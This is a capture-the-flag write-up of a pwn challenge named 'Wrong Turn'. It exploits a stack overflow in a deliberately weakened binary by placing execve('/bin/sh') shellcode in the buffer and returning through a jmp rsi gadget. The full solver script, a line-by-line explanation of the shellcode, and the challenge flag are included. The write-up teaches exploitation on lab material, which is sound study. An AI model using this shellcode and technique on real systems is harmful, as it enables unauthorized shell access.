---
title: "Wrong Turn"
area: the-stack
role: author
event: friendly-2026
published: 2026-09-29
summary: "With an executable stack and no canary, shellcode in buf is reached via a jmp rsi gadget with no leaked address needed."
techniques: ["stack overflow", "ret2shellcode", "executable stack"]
difficulty: medium
arch: amd64
flag: "Securinets{wr0ng_turn_str41ght_1nt0_4_r3g1st3r}"
---

> Category: **pwn** — Tag: **rop**
> Flag: `Securinets{wr0ng_turn_str41ght_1nt0_4_r3g1st3r}`

A classic **ret2shellcode** challenge, but instead of jumping back onto the
stack directly (blocked by NX in most binaries), this one uses a
custom-built `jmp rsi` gadget to redirect execution — matching the flavor
text: *"routes you straight into a register nobody ever sanitized... no
driving back."*

## 1. The program

```c
void gadgets(){
    __asm__("jmp %rsi;");     // a ready-made "jmp rsi" gadget, compiled into the binary
}

void vuln(){
    char buf[0x200];
    read(0, buf, 0x220);      // <-- reads 0x220 bytes into a 0x200-byte buffer: overflow!
    return;
}
```

`checksec` on this binary shows:
```
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX unknown - GNU_STACK missing
Stack:      Executable
RWX:        Has RWX segments
PIE:        No PIE
```

Two things stand out compared to the other overflow challenges:

1. **No stack canary** — a plain overflow can reach the saved return
   address without any secret cookie in the way.
2. **The stack itself is executable** (`GNU_STACK` missing / marked `RWX`
   — a deliberate compile-time choice by the challenge author, since
   normal modern binaries mark the stack non-executable). That means code
   *placed on the stack* can actually run if we jump to it — no need for a
   separate `mmap`'d region like [The Safehouse](../the_safehouse).

Just like Au Revoir and The Safehouse, `vuln()`'s bug is a simple
**stack buffer overflow**: `char buf[0x200]` but `read(0, buf, 0x220)`
allows 32 extra bytes — enough to overwrite the saved return address.

## 2. The plan

Since the stack is executable, the classic approach works: write our own
shellcode into `buf` (on the stack), then overwrite the return address so
that execution jumps *back* into `buf` and runs it.

The one wrinkle on a non-PIE binary with no leaked stack address: **we
don't actually know the exact runtime address of `buf`** to jump to
directly (stack addresses shift around depending on environment
variables, argv, etc., even without ASLR on the binary itself). This is
exactly where the custom `jmp rsi` gadget comes in.

At the point `vuln()` returns, the **`rsi` register still holds a pointer
into/near `buf`** — a side effect of how `read()`'s own calling convention
and the compiler's code generation leave `rsi` pointing at the buffer
address after the call. Rather than needing to know `buf`'s exact address
ourselves, we can jump to a fixed, known gadget address (`gadgets()`,
compiled at a constant location since the binary is non-PIE) that simply
does `jmp rsi` — letting the CPU itself supply the correct, currently-live
buffer address to jump to.

## 3. The exploit — `solver.py`

```python
asmcode = """
    movabs rdi,0x0068732f6e69622f
    push rdi
    mov rdi,rsp
    xor rax, rax
    xor rsi,rsi
    xor rdx,rdx
    mov al,0x3b
    syscall
"""
shellcode = asm(asmcode)
payload = shellcode

payload += b"a"*(0x208-len(payload)) + p64(0x000000000040113a)
p.sendline(payload)
# ret2shellcode, write shellcode into the stack and jmp to ur buffer
```

- **The shellcode** is a hand-written, minimal `execve("/bin/sh", NULL,
  NULL)`:
  - `movabs rdi, 0x0068732f6e69622f` loads the 8-byte little-endian value
    that spells out `"/bin/sh\x00"` (`2f 62 69 6e 2f 73 68 00` reversed)
    directly into a register as an immediate — a common trick to avoid
    needing a separate `.data` string, since immediates can be embedded
    right in the instruction stream.
  - `push rdi` then `mov rdi, rsp` writes that string onto the stack and
    points `rdi` at it — `rdi` is the first argument register, i.e. the
    `pathname` argument of `execve`.
  - `xor rax,rax`, `xor rsi,rsi`, `xor rdx,rdx` zero out `rax`, and set
    `argv`/`envp` (`rsi`/`rdx`) to `NULL`.
  - `mov al, 0x3b` sets `rax = 0x3b` (`59` decimal) — the x86-64 syscall
    number for `execve`.
  - `syscall` invokes the kernel directly: `execve("/bin/sh", NULL,
    NULL)`, replacing the current process with a shell.
- **`payload += b"a"*(0x208-len(payload)) + p64(0x000000000040113a)`** —
  the shellcode is placed at the very *start* of `buf` (so `rsi`, pointing
  near/into `buf` after `read()`, will point at or very near it), then
  padded with junk up to offset `0x208`, and finally the saved return
  address is overwritten with `p64(0x40113a)` — the fixed (non-PIE)
  address of the `jmp rsi` instruction inside `gadgets()`.
- When `vuln()` returns, execution jumps to `0x40113a` (`jmp rsi`), which
  redirects straight into our shellcode sitting on the (executable) stack,
  and `execve("/bin/sh", ...)` runs.

## 4. Running it

```bash
python3 solver.py
```
The overflow writes shellcode onto the stack and hijacks the return
address to `jmp rsi`, landing on the shellcode and spawning a shell.

## 5. Lesson

Even when you can't leak a stack address directly, a live register left
pointing near your buffer (a byproduct of how the compiler generates code
around a `read()` call) can substitute for a leak — as long as you can
find or build a gadget (`jmp reg` / `call reg`) that redirects execution
through that register instead of a hardcoded address. This is also a good
reminder to always double check a binary's protections: `main.c`'s
`__asm__("jmp %rsi;")` only becomes exploitable *because* this build also
disabled NX/marked the stack executable — with NX properly enabled,
jumping onto the stack would simply crash instead of executing.
